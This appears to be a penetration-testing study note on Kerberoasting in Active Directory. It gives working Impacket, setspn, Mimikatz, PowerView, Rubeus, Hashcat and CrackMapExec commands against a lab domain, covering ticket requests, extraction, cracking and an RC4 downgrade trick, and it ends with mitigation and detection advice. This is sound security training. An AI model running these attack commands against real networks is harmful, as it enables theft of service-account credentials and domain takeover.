# Kerberoasting

This attack targets Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as NT AUTHORITY\LOCAL SERVICE. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.

Domain accounts running services are often local administrators, if not highly privileged domain accounts. Due to the distributed nature of systems, interacting services, and associated data transfers, service accounts may be granted administrator privileges on multiple servers across the enterprise. Many services require elevated privileges on various systems, so service accounts are often added to privileged groups, such as Domain Admins, either directly or via nested membership. Finding SPNs associated with highly privileged accounts in a Windows environment is very common. Retrieving a Kerberos ticket for an account with an SPN does not by itself allow you to execute commands in the context of this account. However, the ticket (TGS-REP) is encrypted with the service account’s NTLM hash, so the cleartext password can potentially be obtained by subjecting it to an offline brute-force attack with a tool such as Hashcat.

Service accounts are often configured with weak or reused password to simplify administration, and sometimes the password is the same as the username. If the password for a domain SQL Server service account is cracked, you are likely to find yourself as a local admin on multiple servers, if not Domain Admin. Even if cracking a ticket obtained via a Kerberoasting attack gives a low-privilege user account, we can use it to craft service tickets for the service specified in the SPN. For example, if the SPN is set to MSSQL/SRV01, we can access the MSSQL service as sysadmin, enable the xp_cmdshell extended procedure and gain code execution on the target SQL server.

Reference: https://youtu.be/PUyhlN-E5MU

## Kerberoasting - from Linux
Depending on your position in a network, this attack can be performed in multiple ways:
```
- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using runas /netonly.
```
Several tools can be utilized to perform the attack:
```
- Impacket’s GetUserSPNs.py from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, Rubeus, and other PowerShell scripts.
```
Obtaining a TGS ticket via Kerberoasting does not guarantee you a set of valid credentials, and the ticket must still be cracked offline with a tool such as Hashcat to obtain the cleartext password. TGS tickets take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using a standard cracking rig.

***A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.***

Impacket: https://github.com/SecureAuthCorp/impacket

1. We can start by just gathering a listing of SPNs in the domain. To do this, we will need **a set of valid domain credentials** and the **IP address of a Domain Controller**. We can authenticate to the Domain Controller with a **cleartext password**,** NT password hash**, or even a **Kerberos ticket**. For our purposes, we will use a password. Entering the below command will generate a credential prompt and then a nicely formatted listing of all SPN accounts. From the output below, we can see that several accounts are members of the Domain Admins group. If we can retrieve and crack one of these tickets, it could lead to domain compromise. It is always **worth investigating the group membership of all accounts** because we may find an account with an easy-to-crack ticket that can help us further our goal of moving laterally/vertically in the target domain.

```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

- pull all TGS tickets for offline processing using the -request flag

```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```

- or request just the TGS ticket for a specific account
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

- use the -outputfile flag to write the TGS tickets to a file that can then be run using Hashcat
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

- Cracking the Ticket Offline with Hashcat
```
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

- Testing Authentication against a Domain Controller
```
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

## Kerberoasting - from Windows

> Before tools such as **Rubeus** existed, stealing or forging Kerberos tickets was a complex

***!!! the below method will likely not be our go-to every time. !!!***

**Enumerating SPNs with setspn.exe**

- We will focus on user accounts and ignore the computer accounts returned by the tool

```
setspn.exe -Q */*
```

- request TGS tickets for an account in the shell above and load them into memory. Once they are loaded into memory, we can extract them using Mimikatz
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```
- The `Add-Type` cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
- The `-AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using
- `System.IdentityModel` is a namespace that contains different classes for building security token services
- We'll then use the `New-Object` cmdlet to create an instance of a .NET Framework object
- We'll use the `System.IdentityModel.Tokens` namespace with the `KerberosRequestorSecurityToken` class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session

> We can also choose to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is not optimal.

**Retrieving All Tickets Using setspn.exe**
```
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

Now that the tickets are loaded, we can use Mimikatz to extract the ticket(s) from memory.

**Extracting Tickets from Memory with Mimikatz**

```
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

> If we do not specify the `base64 /out:true` command, Mimikatz will extract the tickets and write them to `.kirbi` files.

Next, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, and we need it all on one line for the next step.

**Preparing the Base64 Blob for Cracking**
```
echo "<base64 blob>" |  tr -d \\n 
```
**Placing the Output into a File as .kirbi**
```
cat encoded_file | base64 -d > sqldev.kirbi
```
**Extracting the Kerberos Ticket using kirbi2john.py (This will create a file called crack_file. We then must modify the file a bit to be able to use Hashcat against the hash.)**
```
python2.7 kirbi2john.py sqldev.kirbi
```
**Modifiying crack_file for Hashcat**
```
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
**Cracking the Hash with Hashcat**
```
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

### Automated / Tool Based Route
- **Using PowerView to Extract TGS Tickets**
```
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```
- **Using PowerView to Target a Specific User**
```
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```
- **Exporting All Tickets to a CSV File**
```
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```
- Viewing the Contents of the .CSV File
```
cat .\ilfreight_tgs.csv
```
#### Using Rubeus
```
- Performing Kerberoasting and outputting hashes to a file
- Using alternate credentials
- Performing Kerberoasting combined with a pass-the-ticket attack
- Performing "opsec" Kerberoasting to filter out AES-enabled accounts
- Requesting tickets for accounts passwords set between a specific date range
- Placing a limit on the number of tickets requested
- Performing AES Kerberoasting
```
- **Using the /stats Flag**
```
.\Rubeus.exe kerberoast /stats
```
Let's use Rubeus to request tickets for accounts with the admincount attribute set to 1. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. Be sure to specify the /nowrap flag so that the hash can be more easily copied down for offline cracking using Hashcat.

- **Using the /nowrap Flag**
```
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
> Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. When performing Kerberoasting in most environments, we will retrieve hashes that begin with `$krb5tgs$23$*`, an RC4 (type 23) encrypted ticket. Sometimes we will receive an AES-256 (type 18) encrypted hash or hash that begins with `$krb5tgs$18$*`. While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using Hashcat, it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen. Let's walk through an example.

> Checking with PowerView, we can see that the `msDS-SupportedEncryptionTypes` attribute is set to `0`. The chart here tells us that a decimal value of 0 means that a specific encryption type is not defined and set to the default of `RC4_HMAC_MD5`.

Reference: https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797

```
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

> Let's assume that our client has set SPN accounts to support AES 128/256 encryption. If we check this with PowerView, we'll see that the `msDS-SupportedEncryptionTypes` attribute is set to `24`, meaning that AES 128/256 encryption types are the only ones supported. To run this through Hashcat, we need to use hash mode `19700`, which is `Kerberos 5`, `etype 18`, `TGS-REP (AES256-CTS-HMAC-SHA1-96)` per the handy Hashcat example_hashes table. We run the AES hash as follows and check the status, which shows it should take over 23 minutes to run through the entire rockyou.txt wordlist by typing s to see the status of the cracking job.

Reference: https://hashcat.net/wiki/doku.php?id=example_hashes

***We can use Rubeus with the `/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility. By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.***

![image](https://github.com/user-attachments/assets/07a5aea5-7e0b-43d3-b379-4e365989ca69)

***In the above image, we can see that when supplying the `/tgtdeleg` flag, the tool requested an RC4 ticket even though the supported encryption types are listed as AES 128/256.***

> Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use.

> It is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options, then double-clicking on Network security: Configure encryption types allowed for Kerberos and selecting the desired encryption type allowed for Kerberos. Removing all other encryption types except for RC4_HMAC_MD5 would allow for the above downgrade example to occur in 2019. Removing support for AES would introduce a security flaw into AD and should likely never be done. Furthermore, removing support for RC4 regardless of the Domain Controller Windows Server version or domain functional level could have operational impacts and should be thoroughly tested before implementation.

Mitigation & Detection

An important mitigation for non-managed service accounts is to set a long and complex password or passphrase that does not appear in any word list and would take far too long to crack. However, it is recommended to use Managed Service Accounts (MSA), and Group Managed Service Accounts (gMSA), which use very complex passwords, and automatically rotate on a set interval (like machine accounts) or accounts set up with LAPS.

Reference: https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009

Reference: https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview

Kerberoasting requests Kerberos TGS tickets with RC4 encryption, which should not be the majority of Kerberos activity within a domain. When Kerberoasting is occurring in the environment, we will see an abnormal number of TGS-REQ and TGS-REP requests and responses, signaling the use of automated Kerberoasting tools. Domain controllers can be configured to log Kerberos TGS ticket requests by selecting Audit Kerberos Service Ticket Operations within Group Policy.

Reference: https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-kerberos-service-ticket-operations

Doing so will generate two separate event IDs: 4769: A Kerberos service ticket was requested, and 4770: A Kerberos service ticket was renewed. 10-20 Kerberos TGS requests for a given account can be considered normal in a given environment. A large amount of 4769 event IDs from one account within a short period may indicate an attack.

Some other remediation steps include restricting the use of the RC4 algorithm, particularly for Kerberos requests by service accounts. This must be tested to make sure nothing breaks within the environment. Furthermore, Domain Admins and other highly privileged accounts should not be used as SPN accounts (if SPN accounts must exist in the environment).

Reference: https://adsecurity.org/?p=3458
